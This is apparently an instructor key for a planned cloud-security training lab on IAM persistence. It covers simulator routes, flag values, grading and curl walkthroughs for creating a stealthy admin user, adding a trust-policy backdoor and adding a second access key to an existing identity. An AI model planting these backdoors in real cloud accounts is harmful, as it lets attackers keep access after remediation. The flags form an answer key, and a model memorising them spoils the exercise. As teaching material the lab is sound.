# Module 5 — Lab 1: Persistence via IAM Backdoors — Instructor Key

> **⚠️ PLANNED CONTENT — not yet built.** Build spec, implementation-ready. Extends
> `iam-sim` from Module 4 (all 5 labs' InstructorKeys are prerequisite reading).
> Flag values below are placeholders generated at planning time.

## New `iam-sim` routes for this lab

| Method | Path | Enforcement | Behavior |
|---|---|---|---|
| POST | `/iam/create-user` | Caller needs `iam:CreateUser` (only genuinely admin-equivalent principals have this) | Creates a new principal with no policies attached yet. Response includes `"flag":"flag{a384b47da8163aad4be0c370913e5b75}"` on first successful call **from a student session** (see Design notes on idempotency) |
| POST | `/iam/attach-user-policy` | Caller needs `iam:AttachUserPolicy` | Attaches the named policy to the target user |
| POST | `/iam/create-access-key` | Caller needs `iam:CreateAccessKey` | Generates a new Access Key ID/Secret for `target_principal`, added to that principal's credential list (principals can have multiple valid keys) |
| POST | `/iam/update-trust-policy` | Caller needs `iam:UpdateAssumeRolePolicy` on the target role | Adds `add_principal` to the role's trust policy `Principal` list (additive, doesn't remove the existing one). Response: `"flag":"flag{240fdca6391a0333e350ee5a7db052b8}"` |
| POST | `/admin/simulate-remediation` | Caller needs to be currently evaluated as admin-equivalent | See "Remediation simulation" below |

## Flag 1 mechanics (`create-user`)

Real AWS: `iam:CreateUser` alone doesn't grant a flag — the **combination** of
creating a user, attaching an admin policy, and creating a working access key for it
is what should be flag-worthy. Implement as: the `flag` field appears on the
`create-access-key` call's response specifically when `target_principal` is a
**newly-created** user (not one of the canonical 6 registry principals) **and** that
user has an attached policy matching `Action:"*",Resource:"*"`. This avoids
rewarding an incomplete backdoor (a user with no policy, or a policy attached but no
usable key).

## Flag 3 mechanics (second key on existing identity)

`create-access-key` targeting `soulsecure-ci-deploy` (or any of the other 4 canonical
identities) returns `"flag":"flag{c104a9c00c97ac0271b34df8255e7196}"` the first time
it succeeds — distinct code path from Flag 1's new-user case, keyed on
`target_principal` being a pre-existing registry principal rather than a
student-created one.

## Remediation simulation (`/admin/simulate-remediation`)

On call, the following happens server-side (idempotent — safe to call more than
once):
1. **Revokes** the original credential values Module 3 handed students for
   `soulsecure-app-role`, `soulsecure-deploy-role`, `soulsecure-ci-deploy`,
   `storage-readonly` (all `Get`/any call with these keys now returns `403
   CredentialsRevoked`).
2. **Patches** the two Lab 3 (Module 4) escalation primitives: removes `iam:PassRole`
   from `DeployRolePolicy`, and resets `CIDeployPolicy` to its original `v1` and locks
   further `SetDefaultPolicyVersion` calls against it.
3. Does **not** touch anything the student created themselves this lab (new users,
   trust-policy additions, extra access keys on existing principals) — by design, this
   is exactly the gap being taught.

After remediation, calling `/sts/get-caller-identity` (or any authenticated route)
with a student-planted backdoor credential returns, alongside the normal response, a
`"flag": "flag{e22bc8281bd20434a1aebefae5218b5e}"` field — **Flag 4**, only appears
post-remediation, only for backdoor-sourced credentials, confirming persistence
survived.

## Flags (ground truth — placeholder values, see banner)

| Flag | Location | Value |
|---|---|---|
| Flag 1 | `/iam/create-access-key` for a newly-created admin-policy'd user | `flag{a384b47da8163aad4be0c370913e5b75}` |
| Flag 2 | `/iam/update-trust-policy` on `soulsecure-finance-role` | `flag{240fdca6391a0333e350ee5a7db052b8}` |
| Flag 3 | `/iam/create-access-key` for `soulsecure-ci-deploy` (existing identity, second key) | `flag{c104a9c00c97ac0271b34df8255e7196}` |
| Flag 4 (harder mode) | Any backdoor credential's authenticated call, post-`/admin/simulate-remediation` | `flag{e22bc8281bd20434a1aebefae5218b5e}` |

## Verification commands (once built)

```bash
curl -sk -X POST https://iam.soulsecure.lab/iam/create-user \
  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>" \
  -H 'Content-Type: application/json' -d '{"username":"svc-monitoring-agent"}'

curl -sk -X POST https://iam.soulsecure.lab/iam/attach-user-policy \
  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>" \
  -H 'Content-Type: application/json' \
  -d '{"username":"svc-monitoring-agent","policy_name":"AdministratorAccess"}'

curl -sk -X POST https://iam.soulsecure.lab/iam/create-access-key \
  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>" \
  -H 'Content-Type: application/json' -d '{"target_principal":"svc-monitoring-agent"}'   # Flag 1

curl -sk -X POST https://iam.soulsecure.lab/iam/update-trust-policy \
  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>" \
  -H 'Content-Type: application/json' \
  -d '{"role_name":"soulsecure-finance-role","add_principal":"svc-monitoring-agent"}'      # Flag 2

curl -sk -X POST https://iam.soulsecure.lab/iam/create-access-key \
  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>" \
  -H 'Content-Type: application/json' -d '{"target_principal":"soulsecure-ci-deploy"}'      # Flag 3

curl -sk -X POST https://iam.soulsecure.lab/admin/simulate-remediation \
  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>"

curl -sk https://iam.soulsecure.lab/sts/get-caller-identity \
  -H "X-Access-Key-Id: svc-monitoring-agent-key" -H "X-Secret-Access-Key: <secret>"         # Flag 4
```

## Grading rubric (out of 100, proposed)

| Criterion | Points |
|---|---|
| Created a new identity with plausible, inconspicuous naming and full admin access | 25 |
| Added a trust-policy backdoor independent of the new-user mechanism | 20 |
| Added a second key to an existing identity, correctly explaining the stealth tradeoff | 20 |
| Ran the remediation simulation and correctly confirmed which credentials broke vs. survived | 20 |
| Clean deliverable table covering all mechanisms with accurate stealth reasoning | 15 |

## Design notes / narrative threads

- Three genuinely different persistence mechanisms in one lab (new identity,
  trust-policy addition, second key on existing identity) so students compare
  detectability tradeoffs directly, not just execute one technique on repeat.
- The remediation simulation targeting **only** what earlier modules established as
  "known compromised" is the whole lesson: a security team's response is only as good
  as their knowledge of what was actually touched. Everything a student does
  *themselves* in this lab is, realistically, outside that knowledge until a much
  more thorough review happens (which is roughly what Module 5 Lab 5's harder mode
  represents).

## File locations (proposed)

- `/opt/soulsecure-labs/apps/iam_sim.py` — add `create-user`, `attach-user-policy`
  (if not already generalized from Module 4 Lab 3's escalation routes),
  `create-access-key` (generalize Module 4's version to accept arbitrary
  `target_principal`), `update-trust-policy`, and
  `/admin/simulate-remediation` with its revocation/patch logic.

## Known limitations

Same as Module 4's `iam-sim` — see those InstructorKeys. `simulate-remediation` is
intentionally simple/deterministic (a training tool, not a red-team-detection
simulator).
